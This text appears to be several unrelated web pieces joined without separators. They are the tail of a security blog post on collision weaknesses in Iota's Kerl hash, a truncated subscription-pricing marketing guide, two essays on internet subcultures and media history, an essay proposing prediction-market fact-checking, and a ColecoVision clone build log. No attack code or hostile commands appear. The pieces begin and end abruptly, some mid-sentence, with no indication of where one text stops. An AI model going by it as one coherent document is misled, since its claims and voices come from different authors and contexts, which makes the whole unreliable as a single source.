<p>I’ve lost count of the number of projects I’ve encountered that used secp256k1 as their elliptic curve choice simply because it was also the curve Bitcoin used. These are protocols doing ECDSA for JSON Web Tokens, or ECDH for use in <a href="https://crypto.stackexchange.com/questions/12823/ecdsa-vs-ecies-vs-ecdh">ECIES</a> schemes.</p>



<p>The probability of someone <em>eventually</em> using Kerl outside of Iota is 1, and they will be vulnerable to collisions because of that choice.</p>



<h2 id="takeaways">Takeaways</h2>



<p>Iota is a cryptocurrency project that threatens security researchers, intentionally backdoored the cryptographic hash function in their original design (for “copy-protection”) and admitted to it, and designed a replacement cryptographic hash function (Kerl) that is vulnerable to trivial collision attacks (but the underlying hash function, Keccak-384, is not).</p>



<p>I don’t need to connect the lines on this one, do I?</p>



<div><figure><img data-attachment-id="975" data-permalink="https://soatok.blog/riley-edit/" data-orig-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png" data-orig-size="580,580" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="riley-edit" data-image-description="" data-medium-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=300" data-large-file="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=580" src="https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=580" alt="" srcset="https://soatok.files.wordpress.com/2020/07/riley-edit.png 580w, https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=150 150w, https://soatok.files.wordpress.com/2020/07/riley-edit.png?w=300 300w" sizes="(max-width: 580px) 100vw, 580px"><figcaption>It’s really freaking obvious.</figcaption></figure></div>



<p>Since this attack also works on “reduced round” variants of Kerl, I guess I win their bug bounty too!</p>



<p>If the Iota developers are reading this, please remit payment for your promised bounty to the following ZEC address: <strong>zs1lwghzjazt4h53gwnl7f24tdq99kw7eh9hgh3qumdvcndszl7ml4xmsudcmm60dut2cfesxmlcec</strong></p>



<p>That being said, I never got an answer to my question, “Should I report the security reduction in bits or trits?” I’m feeling generous though. Given the cost of a collision is basically 1 trit, this is a 242-trit security reduction against collision attacks in Kerl.</p>

How much to charge? or Which pricing model will work best for my subscription business?. The right model can make the difference between capturing customers or losing them. Setting your subscription pricing model helps you to structure how you’ll be charging your customers.&nbsp;<br></p><p><strong>Let's start by understanding what a subscription pricing strategy is in the first place?</strong><br></p><p>The subscription pricing strategy will help you set the pricing model to charge your customers while subscribed for your product. Products can be anything you sell on a recurring basis, such as coffee, software, a washing machine, or even furniture that customers pay monthly. Pricing your product may vary depending on various factors.&nbsp;<br></p><p>In this blog, we'll look at some the most common subscription pricing models, metrics to consider when setting your pricing strategy and how to keep your pricing table looking great.<br></p><p><strong><em>These are some of the questions you need to consider before looking into the subscription pricing models:&nbsp;</em></strong><br></p><ol role="list"><li><strong>What is my business model?&nbsp;</strong></li></ol><p>Think of; What is our customer segment?; Our competitors?; What makes our business unique?. This is important when it comes to selecting your price range as you'll be making sure you are offering the value you are promising to customers.<br></p><p>If you are working on a highly competitive market, you should differentiate on other factors than pricing alone, while niche markets have fewer customers and tend to have higher subscription prices with stronger customer relationships.&nbsp;<br></p><ol start="2" role="list"><li><strong>How to differentiate our company?&nbsp;</strong></li></ol><p>What is our unfair advantage? What is our value proposition? Why would customers care for our product or service? Having a clear understanding of these questions is crucial before setting your pricing strategy as you can differentiate better from other competitors.&nbsp;<br></p><ol start="3" role="list"><li><strong>Who are our customers?&nbsp;</strong></li></ol><p>Most of the time, companies tend to set benefits with price ranges that don't match their customer segment. Put your customers at the center and understand what they need; this will allow your company to better serve your customers.&nbsp;&nbsp;<br></p><ol start="4" role="list"><li><strong>What are our fixed and variable costs?&nbsp;</strong></li></ol><p>How much is our company incurring every month? All costs should be taken into consideration.

Flat-rate pricing</strong><br></p><p>This is the traditional pricing option, especially for SaaS companies. It's a straightforward option, with a single product offering, fixed price per month, and a set of features.&nbsp;<br></p><p>Regardless of how many units are purchased, the unitary costs remain the same.&nbsp;<br></p><p><strong>Pros of flat-rate pricing:</strong></p><ul role="list"><li><strong>Build your customer base.</strong> Subscription pricing models can be complicated, and establishing your customer base is crucial, especially if you are just getting started. Flat-rate pricing allows you to narrow your product offering and to focus on growing and retaining new customers.&nbsp;<br></li></ul><ul role="list"><li><strong>Easier to communicate and to sell.</strong> Flat-rate pricing is offered to one type of customer, making it easy to focus your marketing and sales efforts on selling to a clearly-defined customer.&nbsp;<br></li></ul><p><strong>Cons of flat-rate pricing:</strong></p><ul role="list"><li><strong>Limits the potential future gains.&nbsp; </strong>If you are targeting small businesses where they are more price-sensitive, you'll miss out on the opportunity to charge any other potential revenues from different customer segments.&nbsp;<br></li></ul><ul role="list"><li><strong>Just one shot to acquiring customers. </strong>Customers either love your product and decide to buy it, or they don't. There's little space for you to convince them about buying your product. Also, there’s no room for you to customise your offering.&nbsp;<br></li></ul><p><strong>Example:&nbsp;</strong></p><p><a href="https://basecamp.com/welcome-back"><strong>Basecamp</strong></a><strong> is a great example of flat-rate pricing.&nbsp;</strong></p><figure><p><img src="https://assets-global.website-files.com/5e4302c3ff8f98b64643b252/5edf6ddcc70bdd182cf45a0b_basecamp%20pricing.png" alt=""></p></figure><p><strong>2. Tiered pricing&nbsp;</strong><br></p><p>With a tiered pricing model, you will have different pricing levels. These are products within a particular price range. With the tiered pricing model, you can offer multiple packages with various features, product combinations, and different pricing.&nbsp;<br></p><p>Your product price will go up accordingly to the number of users, purchases, or features needed. Let's say; your customer would pay the same price for the first tier, say, 1 to 100 units, then the price would be lower for the second tier and even lower if they reach a third tier.&nbsp;<br></p><p>Once customers fill up a tier, they move to the next level. Customers will be charged accordingly to the number of purchases they make in each tier.&nbsp;<br></p><p><strong><em>Let's dive a little deeper.</em></strong><br></p><p>The average number of packages can vary, but companies in the subscription space usually have three tiers to differentiate the price points while some others have even more options.&nbsp;<br></p><p>The idea behind a tiered pricing strategy is that your prices and features are tailored according to your customers' needs and use cases.<br></p><p><strong>Pros of Tiered pricing:</strong></p><ul role="list"><li><strong>Tailored packages to suit multiple customers: </strong>While the flat-tire option only resonates to one target customer, tiered pricing can be set to tailor your packages to suit different customer segments.&nbsp;<br></li></ul><ul role="list"><li><strong>It gives you more space to grow.</strong> The tiered pricing strategy gives you a direct route to your customers' next price point so they can buy it when they are ready.&nbsp;<br></li></ul><ul role="list"><li><strong>It gives your company more flexibility:</strong> You can offer a combination of features to various customer segments with different price points. Tiered pricing gives your company flexibility to charge customers in a fast-paced market.&nbsp;<br></li></ul><p><strong>Cons of Tiered pricing:&nbsp;</strong></p><ul role="list"><li><strong>Attract to too many different customer segments. </strong>While this is not something completely wrong, customers can get overwhelmed with so many different choices. It's attractive to create several packages to appeal to every need of your customer, but remember that you can't be everything to everyone. Remember who your customers are and what they value the most.&nbsp;<br></li></ul><ul role="list"><li><strong>It can get messy. </strong>When customers face too many choices, it might lead to indecision on which one to buy. It is also hard to communicate well when a company has outgrown their ‘tier’ and has to move onto a higher ‘tier’. This is why it is also essential to make them aware that your sales or customer team is always there to help them decide which option is best for them.&nbsp;<br></li></ul><p><strong>Tier pricing Structure:</strong><br></p><ul role="list"><li><strong>Basic tier:</strong> Required features customers need to get started using your product.&nbsp;</li><li><strong>Standard tier:</strong> A combination of basic and premium tiers. This tier allows you to show more of your product benefits with an accessible price range and is an ideal source of potential revenue for your company.</li><li><strong>Premium tier:</strong> Usually, for large enterprises and companies that recognise the direct benefit of buying your products over the long run. In a premium tier mostly there are possibilities for specialisations, customisations or additional services.&nbsp;<br></li></ul><p><strong>3. Volume pricing</strong><br></p><p>Similar to tiered pricing, there are different pricing levels to encourage larger (volume) orders. ALL product(s) have the same price when a customer purchases. The price of all the units you're selling is within the set price range.&nbsp;<br></p><p>If your companies' key differentiator is volume, then this is the right option for you.&nbsp;<strong>‍</strong></p><p><strong>4. Pay Per User Pricing&nbsp;</strong><br></p><p>Pay per User is a popular volume measurement, especially when it comes to corporate or enterprise licensed software. Prices scales along with the number of users.&nbsp;<br></p><p><strong>Pros of Pay per User Pricing:</strong></p><ul role="list"><li><strong>It's straightforward.</strong> Per user pricing is simple to understand and simple to sell. Customers can calculate monthly costs based on the number of users they have.<br></li></ul><ul role="list"><li><strong>Opportunity to scale along with the adoption. </strong>Your revenue scales directly with the adoption, making it easier to predict and calculate your forecast each month. The more users you add; generally the cheaper it gets.<br></li></ul><p><strong>Cons of Per per User Pricing:&nbsp;</strong></p><ul role="list"><li><strong>It limits the adoption of your product. </strong>If customers don't perceive more value for buying your product for more users, they could use the same user account for different employees which could incentivise sharing a single login between different team members.</li></ul><ul role="list"><li><strong>It can increase your churn rate and it doesn't really reflect the value of your product.</strong> If it doesn't make a difference for a company that has 10 or 100, by limiting the adoption, you make it easier for customers to abandon your service.&nbsp;<br></li></ul><p><strong>5. Pay Per Feature Pricing&nbsp;</strong><br></p><p>As typically seen in SaaS companies pricing strategies, pay per feature allows customers to pay for the features they consider important or those that they need the most.&nbsp;<br></p><p>Often we see three tiers because it creates a reference for the pricing. The goal is to optimize the pricing for the middle levels, and leave the edges to capture prospects slightly deviated from your customer segment.&nbsp;<br></p><p>People perceive value in different ways. Many of your customers will buy the tier higher than the one they actually need because it's perceived to be a better deal for them.&nbsp;</p><p><strong>Pros of Per Feature Pricing:&nbsp;</strong></p><ul role="list"><li><strong>Motivation to upgrade the package. </strong>With each different package, your customers will be unlocking different features and functionalities that work accordingly to their needs.&nbsp;<br></li></ul><ul role="list"><li><strong>Show the value they will get with each package.&nbsp; </strong>Some of the features you are offering may require an additional amount of resources to deliver, per feature pricing allows you to show the extra benefits by putting these features into your top-tiers.</li></ul><p><strong>Cons of Per Feature Pricing:&nbsp;</strong></p><ul role="list"><li><strong>It's hard to get it right.</strong> Unless you know your customer really well, it is hard to set up your price based on the features you think they'll like.&nbsp;<br></li></ul><p>Spend some time understanding which features are more important to which …</p></div></div></div>

The conversations of internet subcultures often feel substantive and expansive compared to the shallow discourse of presidential debates, op-ed pages, and cable TV shows. Mainstream news cycles rarely last more than a few hours, and their narratives are constantly shifting. They don’t tend to give a big-picture sense of where we came from or where we’re going. Internet subcultures, by contrast, are building grand narratives and <a href="https://www.ecosophia.net/the-kek-wars-part-one-aristocracy-and-its-discontents/" target="_blank" rel="noopener">meme worlds</a> that help people feel their way through the chaos that’s currently unfolding. These stories cut deep,&nbsp;down to the most foundational questions of race and religion and destiny. We shouldn’t be too surprised that complex conspiracy theories, intergenerational trauma, and age-old <a href="https://www.scribd.com/document/431359952/Peter-Thiel-The-Straussian-Moment" target="_blank" rel="noopener">religious</a> fervor are coming to the fore — in a contest of narrative memes, deep history is a serious competitive advantage.

<p>This part of your essay recalled me to our last in-person conversation. In January, you and I were sitting in A/D/O, talking about all manner of things, when you pointed out that every trace of the future seems to have been vanished from popular media. Perhaps this observation was inspired by this sterile piece of public art, whose ceaseless revolutions into new, forgettable arrangements of panels we watched as we conversed.</p>

<p><img src="http://subpixel.space/uploads/ado-panels.jpg" alt="image of rotating panels"></p>

<p>Your observation certainly held true for prestige television: the most popular shows of the last decade have been either gritty realist tragedies (e.g. The Wire, Breaking Bad, even the family politics of Game of Thrones) and unimaginative alternative-now dystopias (e.g. Black Mirror, Handmaid’s Tale, Man in the High Castle). The same could be said for movies, with the addition of campy fantasy, and here I’m sure I showed you this classic David Rudnick tweet. And of course, it’s been said by many that contemporary critical theory seems to have abandoned a progressive agenda beyond enumerating endless variations of capitalism&nbsp;—&nbsp;the carceral, communicative, surveillance…. Even fiction appears to have lost its edge, with last year’s most lauded sci-fi-adjacent novels, Oval and Infinite Detail, failing to render a meaningful vision of the future in any way.</p>

<blockquote><p lang="en" dir="ltr">A training program to acclimatize the citizen under late capitalism to learn and love humanity's new role as spectator and occasional collateral damage in a society consisting of godlike megacorporations and their chaotic interactions? That would be The Marvel Cinematic Universe</p>— ཊལབསརངཧ (@David_Rudnick) <a href="https://twitter.com/David_Rudnick/status/1122271106805719040?ref_src=twsrc%5Etfw">April 27, 2019</a></blockquote>


<p>On the other hand, when optimistic ideas for the future <em>do</em> get proposed (such as carless cities or 100% renewable energy) they are often deemed either unrealistic, delusional, or fiction by mainstream media. I recall coming to the hilarious and grim conclusion that the only type of pop media where a vision of the future is taken seriously is the “request for startup” variety of venture capitalist blog posts. Unfortunately this half-joke was borne out later this year with Marc Andreessen’s TIME TO BUILD essay managing to inspire and invigorate thousands, despite containing no plan for what specifically we should be building towards.</p>

<p>Returning to your essay, it seems that history actually <em>has</em> ended in some meaningful way within mainstream consciousness. While the entire media environment today operates under stream logic — involving&nbsp;the continuous production of new pseudo-events —&nbsp;what is different about legacy 20th-century media institutions is that their discursive progression is wholly ignorant of the past. The evolving discourse of new internet native subcultures, on the other hand, <em>continues to produce history by incorporating new historical facts into themselves.</em> I hope readers take your line “deep history is a serious competitive advantage” literally. Internet-native groups seek out historical events not only because they are politically aware, but because they are in competition with other ideological streams. To combine with Louise Druhle’s analogy, they are under selective pressure to increase their gravitational pull, and in doing so are producing significantly more compelling narratives than mainstream media.</p>

<p>One thing I’m unclear on is why history disappeared from mainstream consciousness in the way it did. Mark Fisher would say that neoliberal subjectivity corrodes one’s imaginary capabilities&nbsp;—&nbsp;the “slow cancellation of the future.” Philip Mirowski would be more explicit, arguing that neoliberal doctrine has had such patently devastating consquences for the working person that it has needed to obscure the origin of its crises and actively shape public discourse to protect itself. I’d also speculate about the separation of public and private spheres we currently tend to make, and the separation of home life, public life, and civic life, both of which also go back to the 70s, but I know little about those things. I guess a good generalization inclusive of all of the above would be that culture is in many ways downstream of capital.</p>

<p>On the other hand, mainstream media may have become ignorant of history as a psychological defense. The development of <a href="https://twitter.com/tobyshorin/status/1273296665416515585">multihistories</a> and memetic competition is just another way of saying the culture war. While we’ve all gotten used to living in a persistent conflict zone, it’s not exactly fun. Under these conditions, the mainstream world of lukewarm takes and forever-breaking news cycles, this Disneyfied universe of crossover events, characterized by the ambient listlessness of memory lapse, provides a sort of dull respite for the mind strained by ideological battle. Do you think this purgatory can last? What is its relationship with centrism? Personally, I’d guess any relief mainstream consciousness provides is illusory. The mainstream is under attack from all sides, with groups of all types attempting to seize its ideological ground. The best defense against ideology remains ideology.</p>

<p>Then there are nomadic anthropologists like you and I. So far, we haven’t declared a side. Up until now I’ve preferred to play the merchant, traveling from tribe to tribe, here selling a rare gem, there performing a clever trick learned far away, collecting oddities and fragments of wisdom as I make my living on the spice route.</p>

<p>You ask:</p>

<p>But if all we’ve said before is true, doesn’t it follow that the actual future of humanity will develop not out of mainstream consciousness but out of one or more of these subcultures with a view of big history. In his New Models interview, Venkat mentioned something along these lines: that while inventing the future once took the ambition and charisma of an Elon Musk or an Edison, it’s now realistic to be able to invent the future for a few thousand citizens of one’s small-scale subjective reality.</p>

<p>That’s one reason why at some point, I think it’s more virtuous to choose the future we want to live in than to arbitrage from culture to another. Personally, I’ve never been able to avoid writing moralizing conclusions to my own essays, and these days I’m inclined to push myself further in that direction. I think that’s my biggest difference from Venkat, and the source of my biggest disagreement with him. What’s the point of developing Correct Opinions if you don’t use them to actualize the future you believe in? That’s one reason I’ve been addressing my writing slightly more toward a business audience. We <em>are</em> living in a liminal time, a time with high tolerance (outside the mainstream) for new ideas and experiments with new ways of living. We have higher leverage than we think.</p>

<p>One area I’m investing time into thinking about is new ownership models and ways of dealing with capital. I don’t understand monetary policy and I’m not particularly knowledgeable about economics, but it’s clear to me that we need new ways of understanding and allocating value the networked 21st century. I believe many of the co-ownership experiments happening in cryptocurrency communities can be made less esoteric and ported to areas outside. Capital ownership is a counterbalance to wage stagnation. Economists say that wealth has universal	 power laws, but designable economic models can surely make the curve more equitable. That’s a future worth working towards, IMO.</p>

<p>To what groups and ideas have you been hitching your camel? What history do you believe everyone should acknowledge? And what future? Your essay left me with questions about the role of the individual. Identity has never been ahistorical, and history has never been apolitical, but now more than ever, our identity is a decision of historical politics. With a self awareness unmatched by any historical subject, we see who we walk alongside, and can choose our caravan. We may not all be history-makers, we are all at least history selectors.</p>

Social media is weaponized, and while people spend more and more time online, they are being influenced by ideas turned into ideologies that may factually be wrong.</p><p id="viewer-bv41a"><a href="https://www.hilltimes.com/author/matt-mcmanus" target="_blank" rel="noopener">Matt McManus</a>, coined the term “<a href="https://www.hilltimes.com/2018/08/27/trump-age-bullshit-roots-knowledge-crisis/155316" target="_blank" rel="noopener">age of bullshit</a>” to express the knowledge crisis we are going through. It’s a dangerous time we live in, and in order to solve many of the challenges we face, we need, first, to focus on the meta-problems.</p><h2 id="viewer-83re0">A solution: the iterative model of truth</h2><h3 id="viewer-b8q47">The COVID19 Tracking Project</h3><p id="viewer-hnvv">As said, the press coverage of COVID-19 was disastrous early on. It led to most people and governments not taking the pandemic seriously. A counterexample of this is the <a href="https://covidtracking.com/" target="_blank" rel="noopener">COVID19 Tracking Project</a>.</p><p id="viewer-a7kdk">This tracking project was not presented as “the Truth” in the way the New York Times does. It shows the most accurate data, with revision history.</p><p id="viewer-544ku">Truth is a process; it’s not something set in stone; it changes. The problem with media corporations is that they present the truth as something fixed — the truth is what they publish. When they mistake, it’s difficult for them to admit that they have mistaken, because they would risk losing their positions as the guardians of the truth.</p><p id="viewer-dl914">It’s not a problem to be incorrect; the problem is not to admit it and build your whole legitimacy on being the truth.</p><h2 id="viewer-a80de">The GitHub Model of Truth</h2><p id="viewer-1vh0c">When’s the last time you heard a politician admitting he or she was wrong? I can’t think of an example. Conversely, if an app crashes, its developers will have no choice but to admit they made a mistake.</p><p id="viewer-fk3m8">It’s the GitHub model of truth. You know there will be mistakes, and you’re okay with it. As soon as you discover a problem, you correct it, and everyone can submit corrections.</p><p id="viewer-4ida7">Truth should follow the Github model. As soon as something is factually wrong, it should be easy to correct it and make the mistake visible to everyone.</p><p id="viewer-4l7ld">But how could we make it a reality outside of the tech world?</p><p id="viewer-e8tjf">For something to work, it must be created in a way that incentives are correctly aligned. Here, we want a collaborative system that gives us the best version of the truth.</p><h2 id="viewer-5otrr">How to Align the Incentives</h2><p id="viewer-a8302">The first idea that comes in mind to align the incentives is to make it financially attractive to be correct. What if “being right” meant earning money? An idea to fix this problem is to modify social media engagement metrics with social features based on a prediction market. Imagine if instead of liking or retweeting a tweet about an economically impactful statement, you could “bet” financially on it.</p><p id="viewer-46ogj">This approach would change the nature of the attention you give to the truth. You wouldn’t want to back the false claims, right? So before “betting” on a tweet, you would do your due diligence of fact-checking it and make sure it’s correct.</p><p id="viewer-c3726">No one should have the ability to say what’s right or wrong. It’s a collective process of multiple people fact-checking the statements and sourcing the information that can lead to the best version of the truth. The era of decentralized media must start if we want the truth.</p><p id="viewer-4djfj">In academia (I know a lot of things are wrong with academia), when a paper is published, it gets reviewed. We should do the same, but, unlike academia, we should do it in a decentralized way.</p><p id="viewer-b9dgk">For example, The <strong>Reproducibility Project: Psychology</strong> was a <a href="https://en.wikipedia.org/wiki/Crowdsourced_psychological_science" target="_blank" rel="noopener">crowdsourced</a> collaboration of 270 contributing authors to repeat 100 published experimental and correlational psychological studies. This idea of reproducing a finding must be transferred outside of the research world. What if independent reporters were doing the same with major stories?</p><p id="viewer-d2436">How would they get paid? The rise of independent journalism is happening now; Substack is an excellent example of it. An increasing amount of people are ready to subscribe to independent journalists to receive their work. It could be a solution to the problem. The <a href="https://taibbi.substack.com/" target="_blank" rel="noopener">newsletter</a> of Matt Taibbi is a great example of this, and another example is the excellent reporting of <a href="https://twitter.com/DellAnnaLuca" target="_blank" rel="noopener">Luca Dellanna</a> during the COVID-19 pandemic. To get the best information on the coronavirus, you had to follow the right people on Twitter, not the prominent publications.</p><p id="viewer-foc37">Decentralized and independent sources of information is also a way to promote <a href="https://marginalrevolution.com/marginalrevolution/2003/11/metarational_an.html" target="_blank" rel="noopener">meta-rationality</a>, a concept <a href="https://twitter.com/tylercowen" target="_blank" rel="noopener">Tyler Cowen</a> brings up a lot. It’s the concept of being aware of your cognitive limitations and know how to trust in topics where you don’t have the expertise to understand.</p><h2 id="viewer-4l0pi">New Social Media</h2><p id="viewer-5g9m7">Is it possible to have this approach to the truth using the existing social media? It seems hard. The social media were built with different motivations at the core. What we need is social media made entirely for the purpose of revealing the truth. As the French investor Xavier Faure <a href="https://twitter.com/XFaure/status/1092444972635303936" target="_blank" rel="noopener">said</a>:</p><blockquote id="viewer-ah70t"><p>“We need a trust social network.

    <p>The boards for the homemade ColecoVision clone project have arrived. It’s been a long haul of finger-burning fun to get the console assembled, but will it ever be able to play a cartridge?</p>

<h2 id="parting-with-cash">Parting, with Cash</h2>
<p>Almost immediately after the Gerbers were sent off to JLCPCB, I ordered the entire BOM from Digi-Key. A huge bag of crap arrived within a few days.</p>

<p>It’s easy to lose scale on how big things really are when you’re constantly fighting for those fractions of a millimeter to route traces. At human-scale, I was a little shocked by how small a lot of the components were. All the SOT-23 stuff is smaller than a pinky fingernail and has teeny-tiny pins that don’t stick out very far. There’s no better way than this to get better at surface-mount soldering!</p>

<p>There were a couple problems with the order, but that’s to be expected. This was definitely the biggest parts-count board I’ve ever done, and I learned a lot. Things like, don’t leave making the BOM until the very last minute, because it takes an entire morning and four cups of coffee. And that you should always do the BOM <em>before</em> you order the board, in case your footprints aren’t right.</p>

<p>One big problem was that I wasn’t able to find a bi-polar 68µF capacitor in 0805. You’d think that would be easy, but it appears the laws of physics forbid it. I changed the footprint (<em>after</em> ordering the board, of course) to a larger 1206 and then ordered some through-hole ceramic caps that I could bodge onto the pad. Said 68µF capacitor is for the clock circuit, so I think its value was quite important:</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-68uf-cap.png" alt="The 68µF capacitor in question, nestled between a 2n3904 transistor and some flip-flops."></p>

<p>You might be asking yourself why I need such a big capacitor for a clock circuit. Aren’t clock circuits usually using <em>pico</em>-Farads? Well…….</p>

<p>A few hours after I ordered the parts, I got an email from Digi-Key saying that there was an inventory discrepancy and that they actually only had one 2kΩ 0805 surface-mount resistor in stock, not two. This was a pretty funny idea to me, that their inventory robots would constantly be shuttling past a sad bin that only contains one minuscule resistor in an extremely common capacitance.</p>

<p>What was even funnier is that the part was now <em>discontinued</em> - as if a bunch of people working at the resistor factory got told by their boss that he doesn’t think anyone’s going to really want 2kΩ resistors anymore. “No, what customers want now is <em>capacitors</em>,” he’ll chuckle at his business acumen, while the resistor department’s hated rival, Bob Dielectric, rubs his hands in glee. I ordered literally one hundred 2kΩ 0805s from a different manufacturer for a buck instead.</p>

<p>What’s not as funny is that the cartridge slot I had paid six bucks for came without pins. When I saw it on Digi-Key, it had been listed without an image, but I figured there was no way it wouldn’t come without pins. After cursing myself, I ordered up another bunch of 0.1” 30-pin edge connector slots, except this time with pins. The new Sullins-branded ones came in a fetching shade of blue and - just to rub it in - cost a little less. However, they still weren’t what I was looking for…</p>

<p>Another small opposition to the project came in the form of some local scumbag, who stole one of the DigiKey orders off my porch, tore it open, presumably found nothing that they could fence or snort, and then threw the opened box into my backyard. Everything was still there, but clearly the forces of “I’d really like some drugs” are aligned against the Leako Initiative.</p>

<p>And, yes, the clock circuit did ask for 68 <em>pF</em>. I made a mistake reading it off the schematic, which changed between notations of capacitors depending on which sheet you were looking at. I figured this out a while later, which I’m not very proud of.</p>

<h2 id="sound-off">Sound Off</h2>
<p>Another mistake I made was not reversing the data bus on the 76489 sound chip. Like the TMS9918, this TI sound chip is also ‘backwards’ from the Z80’s data pin convention: pin D<sub>0</sub> on the Z80 goes to D<sub>7</sub> on the 76489 and so on.</p>

<p>I resolved to bodge wire this onto a piece of protoboard, and just live with the shame for now. Unfortunately, the sound chips took several months to arrive (coronavirus again,) so I ended up just going ahead with the v0.2 board, where I made this change. Despite the counterfeits and recaps, it is great to ride the “80s grey-market sound chip” market until something like this happens to screw it up.</p>

<p>When one of the orders of SN78649s arrived, I built a breadboard tester for it powered by an Arduino. I had heard that the reliability of these chips was very low, so I expected not very many of them would work. The first chip I tested worked great - except that my code was terrible and didn’t produce a reliable result due to bad timing.</p>

<center><iframe width="560" height="315" src="https://www.youtube.com/embed/ZMITqYnvz-A" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center>

<p>After a few hours of bodging and reading <a href="https://www.smspower.org/Development/SN76489">documentation on SMSPower</a>, I managed to figure out how to test the chip. Here it is cycling through channels 0, 1, 2 and the two kinds of noise supported by the chip. At least we’ve got <em>one</em> known-good salvage part!</p>

<h2 id="controller-prep">Controller Prep</h2>
<p>The controller I ordered as part of a lot from Quebec in the previous entry arrived almost immediately, and I set about tearing it down and cleaning it. It was really gross! The plastics got washed in my kitchen sink, the coiled cord scrubbed <a href="https://www.leadedsolder.com/2019/10/29/pc8801mh-keyboard-clean.html">with the flossing method</a>, and the (delaminating) matrix keypad got a once-over with some disinfecting wipes.</p>

<p>It had one missing coarse-thread Phillips screw, which I replaced with another from my junk drawer. I still haven’t figured out how to get a new shiny ‘grip disc’ for the top of the joystick - maybe I’ll make something with hockey tape.</p>

<p>Cleaning and servicing controllers doesn’t need a whole lot of focus or technical skill, which makes it the perfect task to say you’ve actually done <em>something</em> on a project today.</p>

<p>The wires that go from the DE9 cable onto the PCB are just crimped onto the pads on the PCB. A bunch of these crimps were super loose and probably not making good contact, which might be the reason why this controller was getting sold with the other junky parts. I tried to tighten them up, but one tragically snapped as soon as I applied any force:</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-controller-dead-crimp.jpg" alt="A good and a bad crimp. The red one (bottom) has lost one of its little crimpy 'wings'."></p>

<p>I decided I would cut off all the crimps and solder the wires directly to the board. This worked okay, except that the insulation on the wires was definitely not solder-heat proof and melted. Since the pads had never been used for solder in 37 years, I decided it would also be prudent to put a little liquid flux on them in order to prep them for the solder.</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-controller-crimps-cut.jpg" alt="The cut crimps in a pile."></p>

<p>The joints weren’t pretty since I had to work fast. That’s my excuse. Also, I had to desolder the entire thing and do it again after I realized the wires have to slip through the back plastic case and so should be soldered only <em>after</em> threading them through…</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-controller-soldered-wires.jpg" alt="The wires soldered to the ColecoVision controller PCB. The PCB calls out the colour of each wire."></p>

<p>Finally, after some fighting, I was able to reassemble the controller. It wasn’t a great fit, even with the new screw, because the lower plastics that clip together had broken from age and abuse. Also, I didn’t do a great job of actually cleaning the top plastic for fear of rusting the spring, so I went back and did another quick scrubbing with a q-tip and isopropyl alcohol.</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-controller-reassembled.jpg" alt="The re-assembled controller."></p>

<p>That was a lot of work for an ugly controller that doesn’t feel that great in the end… I hoped it would at least work. I can always buy or build a nicer one later.</p>

<h2 id="get-onboard">Get Onboard</h2>
<p>Eventually, the boards shipped from the fab. One of them had been ‘scratched’ during the assembly process, so I was fully refunded on it. It’s still nice enough to use for a practice board in the future.</p>

<p>And as soon as they shipped, I noticed something a little weird. Remember last episode, where I told you about how to wire up a clock divider? Well, the new clock divider I added to go from 14MHz down to 7MHz was done correctly, but not the “original” clock divider from the schematic that I blindly copied.</p>

<p>Here are the two dividers in different schematics:</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-bad-clock-divider.png" alt="The schematic that was sent off to fab. The not-Q output is not connected to anything."></p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-good-clock-divider.png" alt="The schematic that I discovered after fabrication. The not-Q output is connected to the D-input."></p>

<p><a href="https://atariage.com/forums/topic/285656-new-colecovision-schematics/">The latter schematics, by an Atari Age user known as ChildOfCv</a>, were meticulously double-checked. Had I known there were errors in the original schematic, I probably would have gone from the start with ChildOfCv’s. I have a huge debt to the original schematics, of course, as that is an immense amount of work. One or two errors here isn’t surprising in a task like that. It was only here that I discovered my 68pF clock circuit error, in case you’re keeping track.</p>

<p>Clearly, it was time to rework my clock circuit and spin a v0.2 with all the other problems I’d noticed. This made the board a little uglier in some spots, as I tried to reintroduce chips into the same general location they had once occupied but ran new traces. My timing circuit got split up when I put it on the board originally (since I left it for almost last), so changing it isn’t necessarily a matter of removing one chunk of the board and laying a new one down. I’ll try to get better at keeping physical space for “zones of responsibility” on future projects. Still, though, the re-routing took less than an hour and I was able to send the v0.2 board off:</p>

<p><img src="https://www.leadedsolder.com/assets/colecovision-v0.2.png" alt="The ColecoVision v0.2 board as viewed by the JLCPCB gerber viewer."></p>

<p>Why yes, I <em>did</em> put Q3, a through-hole transistor, right in the way of the plastic shell of the cartridge when it is inserted into the slot. Good thing they have bendy legs…</p>

<h2 id="v01-arrives">v0.1 Arrives</h2>
<p>Even though I knew that my first-born clone board had some flaws, it was hard not to smile when I unpacked the boards. They’re so <em>tiny</em>, but they (will) do so much!</p>

<p><img src="https://www.leadedsolder.com/assets/leako-v0.1.jpg" alt="The (red) v0.1 boards, front and back."></p>

<p>That RAM chip next to the Z80 being so far north really bugs me now, although I hardly noticed it before. If it works…</p>

<p><img src="https://www.leadedsolder.com/assets/leako-v0.1-posed.jpg" alt="The v0.1 board on some improvised standoffs"></p>

<p>I used some of <a href="https://en.wikipedia.org/wiki/Spacers_and_standoffs">those little jackscrew standoff retainers that hold on VGA cables</a> to stand the board up off the table. This is important not just for looks, avoiding shorts, and cooling, but because there are chips on both sides. They weren’t a perfect fit for an M3 hole, but when screwed tightly together they don’t wobble. At last, the junk-bin investment is paying off.</p>

